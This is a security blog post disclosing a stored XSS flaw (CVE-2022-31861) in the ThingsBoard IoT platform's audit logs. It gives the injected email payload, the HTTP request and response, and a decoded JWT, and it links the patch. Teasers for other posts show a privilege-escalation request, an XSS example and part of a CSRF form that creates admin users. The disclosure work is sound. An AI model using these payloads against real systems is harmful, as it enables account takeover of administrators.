=== Content from securityblog101.blogspot.com_87f152dd_20250115_092335.html ===

[Skip to main content](#main)

# [CVE Disclosures](https://securityblog101.blogspot.com/)

Author: Bhaskar Tejaswi (https://users.encs.concordia.ca/~b\_tejasw/)

### CVE-ID: CVE-2022-31861

* Get link
* Facebook
* X
* Pinterest
* Email
* Other Apps

[September 11, 2022](https://securityblog101.blogspot.com/2022/09/cve-2022-31861.html "permanent link")

Cross site Scripting (XSS) in ThingsBoard IoT Platform through 3.3.4.1 via a crafted value being sent to the audit logs.

Patch details: <https://github.com/thingsboard/thingsboard/pull/7385>

Audit logs help in establishing accountability of usage among various users of an application. However, if this functionality is not implemented securely, attackers can abuse the implementation flaws to launch attacks against application users. In this blog, we take a look at an XSS vulnerability in the audit logs feature of Thingsboard, an open-source IoT platform, and how it leads to account takeover of admin accounts. This vulnerability can be exploited by an existing lower privileged user of the platform.

According to Thingsboard's documentation (<https://thingsboard.io/docs/pe/user-guide/rbac/>), on the community edition, *"a tenant administrator manages devices, dashboards, customers, and other entities that belong to a particular tenant".* Each tenant has several customers and as per documentation - *"Customer user is able to view dashboards and control devices that are assigned to a specific customer."* If a customer is able to take over the account of a tenant admin, that customer would be able to target all other customers belonging to the same tenant.

A stored cross-site scripting vulnerability on Thingsboard lets a customer take over the account of a tenant admin. A customer has view-only privilege for most functionalities. However, a customer can edit their own profile, and insert an XSS payload in the "email" parameter.  This XSS payload gets injected in the audit logs page, and when a tenant admin views the audit logs, the customer gets the tenant admin's authentication token (stored in LocalStorage).

Below is the underlying HTTP POST request in which the customer inserts an XSS payload in the email parameter, followed by the HTTP response (providing the complete request/response without masking any sensitive field, as the information corresponds to default accounts on a local installation of Thingsboard community edition).**HTTP Request:**
POST /api/user?sendActivationMail=false HTTP/1.1Host: localhost:8080User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0Accept: application/json, text/plain, \*/\*Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateContent-Type: application/jsonX-Authorization: Bearer eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiJjdXN0b21lckB0aGluZ3Nib2FyZC5vcmciLCJ1c2VySWQiOiJkN2VkYjliMC0zMWViLTExZWQtYmVhOS00M2MzY2JjODFhNjMiLCJzY29wZXMiOlsiQ1VTVE9NRVJfVVNFUiJdLCJpc3MiOiJ0aGluZ3Nib2FyZC5pbyIsImlhdCI6MTY2MzA5NTI4OCwiZXhwIjoxNjYzMTA0Mjg4LCJmaXJzdE5hbWUiOiJ0ZXN0MDFzIiwibGFzdE5hbWUiOiJoa2Jja2EiLCJlbmFibGVkIjp0cnVlLCJpc1B1YmxpYyI6ZmFsc2UsInRlbmFudElkIjoiZDc0ZWUxYTAtMzFlYi0xMWVkLWJlYTktNDNjM2NiYzgxYTYzIiwiY3VzdG9tZXJJZCI6ImQ3ZGZkNzAwLTMxZWItMTFlZC1iZWE5LTQzYzNjYmM4MWE2MyJ9.Gg-KmkQn7Bv2-in8CLEVt8VKtTHTDxUpOfbzIouaND5gYP74JnUC5tOwPR-Ebm4xpeVzG9ooYOS3KIYRFuKBsgContent-Length: 758Origin: http://localhost:8080Connection: closeReferer: http://localhost:8080/profile
{"id":{"entityType":"USER","id":"d7edb9b0-31eb-11ed-bea9-43c3cbc81a63"},"createdTime":1662912452811,"additionalInfo":{"userPasswordHistory":{"1662912452941":"$2a$10$raEXkVa09GJaH3UnbFIKMeyQTypYThWhwpe0pHEMuZ3ZX80VIrcWu"},"failedLoginAttempts":0,"lastLoginTs":1663095288216,"userCredentialsEnabled":true,"lang":"en\_US","homeDashboardHideToolbar":true},"tenantId":{"entityType":"TENANT","id":"d74ee1a0-31eb-11ed-bea9-43c3cbc81a63"},"customerId":{"entityType":"CUSTOMER","id":"d7dfd700-31eb-11ed-bea9-43c3cbc81a63"},**"email":"customer@thingsboard.org<img src=# onerror=alert(localStorage.getItem('jwt\_token'))>"**,"authority":"CUSTOMER\_USER","firstName":"test","lastName":"test","name":"customer@thingsboard.org","language":"en\_US","homeDashboardHideToolbar":true}
**HTTP Response:**
HTTP/1.1 400 Vary: OriginVary: Access-Control-Request-MethodVary: Access-Control-Request-HeadersX-Content-Type-Options: nosniffX-XSS-Protection: 1; mode=blockCache-Control: no-cache, no-store, max-age=0, must-revalidatePragma: no-cacheExpires: 0Content-Type: application/json;charset=ISO-8859-1Content-Length: 202Date: Tue, 13 Sep 2022 18:56:57 GMTConnection: close
{"status":400,"message":"Invalid email address format 'customer@thingsboard.org<img src=# onerror=alert(localStorage.getItem('jwt\_token'))>'!","errorCode":31,"timestamp":"2022-09-13T18:56:57.476+00:00"}
We can confirm that the user who issued this request is indeed a customer by decoding the JWT token used in the request:
**JWT:**
eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiJjdXN0b21lckB0aGluZ3Nib2FyZC5vcmciLCJ1c2VySWQiOiJkN2VkYjliMC0zMWViLTExZWQtYmVhOS00M2MzY2JjODFhNjMiLCJzY29wZXMiOlsiQ1VTVE9NRVJfVVNFUiJdLCJpc3MiOiJ0aGluZ3Nib2FyZC5pbyIsImlhdCI6MTY2MzA5NTI4OCwiZXhwIjoxNjYzMTA0Mjg4LCJmaXJzdE5hbWUiOiJ0ZXN0MDFzIiwibGFzdE5hbWUiOiJoa2Jja2EiLCJlbmFibGVkIjp0cnVlLCJpc1B1YmxpYyI6ZmFsc2UsInRlbmFudElkIjoiZDc0ZWUxYTAtMzFlYi0xMWVkLWJlYTktNDNjM2NiYzgxYTYzIiwiY3VzdG9tZXJJZCI6ImQ3ZGZkNzAwLTMxZWItMTFlZC1iZWE5LTQzYzNjYmM4MWE2MyJ9.Gg-KmkQn7Bv2-in8CLEVt8VKtTHTDxUpOfbzIouaND5gYP74JnUC5tOwPR-Ebm4xpeVzG9ooYOS3KIYRFuKBsg
**Decoded JWT payload** (from [jwt.io](http://jwt.io)):
{  "sub": "customer@thingsboard.org",  "userId": "d7edb9b0-31eb-11ed-bea9-43c3cbc81a63",  "scopes": [    "CUSTOMER\_USER"  ],  "iss": "thingsboard.io",  "iat": 1663095288,  "exp": 1663104288,  "firstName": "test01s",  "lastName": "hkbcka",  "enabled": true,  "isPublic": false,  "tenantId": "d74ee1a0-31eb-11ed-bea9-43c3cbc81a63",  "customerId": "d7dfd700-31eb-11ed-bea9-43c3cbc81a63"}
When a tenant admin views the audit logs, the payload injected by the customer (i.e., **<img src=# onerror=alert(localStorage.getItem('jwt\_token'))>** executes on the browser of the tenant admin, as shown below.
[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhFxENbxfVuvwiyFHb5JMfxHBg5ZsBn1daSb3QeMqoFv1hlmdxHdfZZf2ZqLYPqARbo8vBVyVM--AZC_f0HKoCm8Pbgy2ZDRIivAg7PqvpHpYkj7Oq7qkwzP9O1TPMjsKEjFJGOO_1ykwQSDV8P74v5aB-TlVtgYawlour-04-85yf9JCXIG1xlvv6H0g/s16000/thingsboad_xss_actual.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhFxENbxfVuvwiyFHb5JMfxHBg5ZsBn1daSb3QeMqoFv1hlmdxHdfZZf2ZqLYPqARbo8vBVyVM--AZC_f0HKoCm8Pbgy2ZDRIivAg7PqvpHpYkj7Oq7qkwzP9O1TPMjsKEjFJGOO_1ykwQSDV8P74v5aB-TlVtgYawlour-04-85yf9JCXIG1xlvv6H0g/s1607/thingsboad_xss_actual.png)
**References:**<https://github.com/thingsboard/thingsboard><https://owasp.org/www-community/attacks/xss/>

* Get link
* Facebook
* X
* Pinterest
* Email
* Other Apps

### Popular posts from this blog

### [CVE-ID: CVE-2022-35135, CVE-2022-35136](https://securityblog101.blogspot.com/2022/10/cve-id-cve-2022-35135-cve-2022-35136.html)

[October 12, 2022](https://securityblog101.blogspot.com/2022/10/cve-id-cve-2022-35135-cve-2022-35136.html "permanent link")

CVE-2022-35136:  Boodskap IoT Platform v4.4.9-02 allows attackers to make unauthenticated API requests. CVE-2022-35135:  Boodskap IoT Platform v4.4.9-02 allows attackers to escalate privileges  via a crafted request sent to /api/user/upsert/<uuid>.  The platform successfully processes API requests even without valid cookies.For example, the following request to update user profile is processed, even though the request does not have any cookie/api key. (Cookie header is blank in the request) Since API requests to the platform are not authenticated, a user can assign themselves an admin role, by sending a request to  http://192.168.72.157/api/user/upsert/<userid>  endpoint. HTTP Request: POST /api/user/upsert/8c34fa03- 706a-4dc7-b484-cd8e0c329c81 HTTP/1.1 Host: 192.168.72.157 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:101.0) Gecko/20100101 Firefox/101.0 Accept: \*/\* Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Conten...

[Read more](https://securityblog101.blogspot.com/2022/10/cve-id-cve-2022-35135-cve-2022-35136.html "CVE-ID: CVE-2022-35135, CVE-2022-35136 ")

### [CVE-ID: CVE-2022-35134](https://securityblog101.blogspot.com/2022/10/cve-id-cve-2022-35134.html)

[October 12, 2022](https://securityblog101.blogspot.com/2022/10/cve-id-cve-2022-35134.html "permanent link")

[![Image](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhErc1gXtzmWCOQQMv1qNsr5wtwu2wKF2lWRMZPspvrtEbnfq1D_J42q69Y1P4lyg0SwP82AlvGSJ81xYIM_XALtjSbgawiqJ9QX8Bk-XX_HsV018WxF0DMuG4ZVfDTc1m2ZsAL4m1-VKzIxWirFLg9tp6dBRfCkUsMQVnDR8FpG_R3LYp3gfpn3acc3A/s16000/BOODSKAP_XSS_1.png)](https://securityblog101.blogspot.com/2022/10/cve-id-cve-2022-35134.html)

  Boodskap  IoT Platform v4.4.9-02 contains a cross-site scripting (XSS)  vulnerability. The application does not enforce input validation and output sanitization in multiple functionalities.  Example 1: domain name can be set to <script>alert(1)</script> Example 2: A lower privilege user can change their name to include a XSS payload, and target the admin user References: https://cheatsheetseries.owasp.org/cheatsheets/Cross\_Site\_Scripting\_Prevention\_Cheat\_Sheet.html

[Read more](https://securityblog101.blogspot.com/2022/10/cve-id-cve-2022-35134.html "CVE-ID: CVE-2022-35134")

### [CVE-ID: CVE-2022-34020](https://securityblog101.blogspot.com/2022/09/cve-2022-34020.html)

[October 12, 2022](https://securityblog101.blogspot.com/2022/09/cve-2022-34020.html "permanent link")

Cross Site Request Forgery (CSRF) vulnerability in ResIOT ResIOT IOT Platform + LoRaWAN Network Server through 4.1.1000114 allows attackers to add new admin users to the platform or other unspecified impacts. ResIOT® IOT Platform + LoRaWAN Network Server (on-premise version) V.4.1.1000114  does not use any CSRF protection mechanism. It is possible for an attacker to launch CSRF attacks against users of the platform. An attacker can abuse CSRF to perform actions, such as creating a user on the platform. For this, the attacker can prepare a HTML form such as follows, host it online and send the form's link to a ResIoT admin user. <html>   <body>   <script>history.pushState('', '', '/')</script>     <form action=" http://172.20.32.1: 8088/UserorgApi/?domain=172. 20.32.1&protocol=http:&email= test111@gmail.com&firstname= test&lastname=one&password= V79NrFNCAxZNXtg&phone= 77777777777 " method="POST...

[Read more](https://securityblog101.blogspot.com/2022/09/cve-2022-34020.html "CVE-ID: CVE-2022-34020")

[Powered by Blogger](https://www.blogger.com)

### [Report Abuse](https://www.blogger.com/go/report-abuse)


